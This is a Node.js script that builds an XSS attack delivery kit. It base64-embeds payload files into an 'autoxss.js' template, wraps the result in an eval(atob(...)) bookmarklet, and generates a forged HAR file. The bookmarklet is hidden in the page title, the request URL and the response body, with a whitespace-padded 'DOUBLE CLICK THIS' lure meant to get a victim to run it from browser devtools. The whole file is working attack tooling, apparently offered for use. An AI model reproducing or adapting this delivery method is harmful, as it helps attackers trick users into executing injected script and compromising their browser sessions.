const fs = require('fs');
const path = require('path');

function readAndEncode(filePath) {
  const content = fs.readFileSync(filePath, 'utf-8');
  return Buffer.from(content, 'utf-8').toString('base64');
}

const entry_b64 = readAndEncode('entry/entry.html');
const index_html_b64 = readAndEncode('payloads/index.html');
const index_js_b64 = readAndEncode('payloads/index.js');

let autoxss_js = fs.readFileSync('autoxss.js', 'utf-8');

autoxss_js = autoxss_js.replace('putentrycontentshere', entry_b64);
autoxss_js = autoxss_js.replace('putindex.htmlcontentshere', index_html_b64);
autoxss_js = autoxss_js.replace('putindex.jscontentshere', index_js_b64);

fs.writeFileSync('xss.js', autoxss_js);
console.log("\x1b[1m\x1b[32m:D\x1b[0m Built fresh xss.js");

const now = new Date();
const nowISOString = now.toISOString();
const base64Code = Buffer.from(autoxss_js, 'utf-8').toString('base64');
const bookmarkletUrl = `javascript:(function(){eval(atob("${base64Code}"))})()`;

const har = {
  log: {
    version: "1.2",
    creator: { name: "NodeJS HarGen", version: "1.0" },
    pages: [{
      startedDateTime: nowISOString,
      id: "page_1",
      title: bookmarkletUrl,
      pageTimings: {
        onContentLoad: 57.19,
        onLoad: 57.77
      }
    }],
    entries: [{
      _connectionId: "16771",
      _initiator: {
        type: "script",
        stack: {
          callFrames: [{
            functionName: "",
            scriptId: "9",
            url: "",
            lineNumber: 11,
            columnNumber: 4
          }]
        }
      },
      _priority: "High",
      _resourceType: "fetch",
      cache: {},
      connection: "443",
      pageref: "page_1",
      request: {
        method: "GET",
        url: bookmarkletUrl + '//' + ' '.repeat(20) + 'DOUBLE CLICK THIS',
        httpVersion: "h3",
        headers: [
          { name: ":authority", value: "" },
          { name: ":method", value: "GET" },
          { name: ":path", value: bookmarkletUrl },
          { name: ":scheme", value: "javascript" },
          { name: "accept", value: "*/*" },
          { name: "user-agent", value: "Mozilla/5.0" }
        ],
        queryString: [],
        cookies: [],
        headersSize: -1,
        bodySize: 0
      },
      response: {
        status: 200,
        statusText: "",
        httpVersion: "h3",
        headers: [
          { name: "content-type", value: "application/javascript; charset=utf-8" }
        ],
        cookies: [],
        content: {
          size: autoxss_js.length,
          mimeType: "application/javascript",
          text: autoxss_js
        },
        redirectURL: "",
        headersSize: -1,
        bodySize: -1
      },
      serverIPAddress: "0.0.0.0",
      startedDateTime: nowISOString,
      time: 100,
      timings: {
        blocked: 0,
        dns: 0,
        ssl: 0,
        connect: 0,
        send: 0,
        wait: 50,
        receive: 50,
        _blocked_queueing: 0
      }
    }]
  }
};

const month = String(now.getMonth() + 1).padStart(2, '0');
const day = String(now.getDate()).padStart(2, '0');
const year = String(now.getFullYear()).slice(-2);
const filename = `hartools-${month}|${day}|${year}.har`;

fs.writeFileSync(filename, JSON.stringify(har, null, 2));
console.log(`\x1b[1m\x1b[32m:D\x1b[0m HAR file generated: ${filename}`);
